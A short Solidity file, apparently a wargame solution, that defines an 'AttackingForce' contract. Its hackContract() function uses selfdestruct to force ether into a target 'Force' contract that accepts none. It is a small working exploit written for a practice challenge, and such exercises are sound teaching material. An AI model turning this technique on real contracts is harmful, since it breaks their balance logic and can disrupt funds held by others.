// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Force.sol";

/*
 * Self-destruct removes bytecode from the current address and sends all remaining eth balance to the target address.
 */

contract AttackingForce {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external payable {
        selfdestruct(payable(contractAddress));
    }
}
